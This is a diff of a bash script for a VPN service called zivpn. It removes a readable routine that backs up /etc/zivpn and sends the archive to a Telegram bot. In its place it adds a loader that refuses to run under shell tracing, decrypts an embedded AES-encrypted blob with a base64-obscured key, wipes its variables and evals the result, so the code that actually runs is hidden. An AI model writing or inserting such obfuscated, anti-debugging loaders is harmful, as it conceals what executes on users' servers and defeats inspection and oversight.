@@ -1,56 +1,31 @@
 #!/bin/bash
 
-# --- Helper function to send a document to Telegram ---
-send_document() {
-    local file_path="$1"
-    local caption="$2"
-    BOT_CONFIG="/etc/zivpn/bot_config.sh"
+# --- LOADER ---
+if [[ $(ps -o args= -p $$) == *"bash -x"* || $(ps -o args= -p $$) == *"sh -x"* ]]; then
+    echo "Debugging is not allowed." >&2
+    exit 1
+fi
 
-    # Load bot config if it exists
-    if [ -f "$BOT_CONFIG" ]; then
-        source "$BOT_CONFIG"
-    else
-        # Exit silently if bot is not configured
-        return
+__run_protected() {
+    local encrypted_content='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'
+    local obfuscated_key='Mjc3MmU2N2MxYTMxMTIzOWM1MzQxNjk0NjM5NWU0OWQwZDc4NGM4NGFmNWU1OGY4NzVkMDI2YTkyZWYwNmNmZg=='
+
+    local decoded_key=$(echo "$obfuscated_key" | base64 -d)
+    if [ -z "$decoded_key" ]; then
+        echo "Error: Failed to decode key." >&2
+        return 1
     fi
 
-    # Check for BOT_TOKEN and CHAT_ID
-    if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
-        return
+    local decrypted_content=$(echo "$encrypted_content" | base64 -d | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:"$decoded_key" 2>/dev/null)
+    if [ -z "$decrypted_content" ]; then
+        echo "Error: Decryption failed." >&2
+        return 1
     fi
 
-    # Send the document using curl in silent mode
-    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
-         -F "chat_id=${CHAT_ID}" \
-         -F "document=@${file_path}" \
-         -F "caption=${caption}" > /dev/null
+    # Bersihkan jejak sebelum eksekusi
+    unset encrypted_content obfuscated_key decoded_key
+
+    eval "$decrypted_content"
 }
 
-# --- Main Backup Logic ---
-BACKUP_DIR="/root"
-BACKUP_FILE="$BACKUP_DIR/zivpn_backup_$(date +%Y-%m-%d).tar.gz"
-CONFIG_DIR="/etc/zivpn"
-DOMAIN=$(cat /etc/zivpn/domain.conf 2>/dev/null || echo "Not Set")
-IP_ADDRESS=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
-
-# Create the backup archive
-tar -czf "$BACKUP_FILE" -C "$CONFIG_DIR" .
-
-# Check if the backup was created successfully
-if [ -f "$BACKUP_FILE" ]; then
-    # Create a professional caption for the Telegram message
-    CAPTION=" ZIVPN AUTO BACKUP
- --------------------
- 🗓 DATE: $(date +'%d-%m-%Y %H:%M:%S')
- --------------------
- 🌎 DOMAIN: ${DOMAIN}
- 🌐 IP      : ${IP_ADDRESS}
- --------------------
- ✅ Backup was successful"
-
-    # Send the backup file to Telegram
-    send_document "$BACKUP_FILE" "$CAPTION"
-
-    # Remove the local backup file after sending
-    rm "$BACKUP_FILE"
-fi
+__run_protected
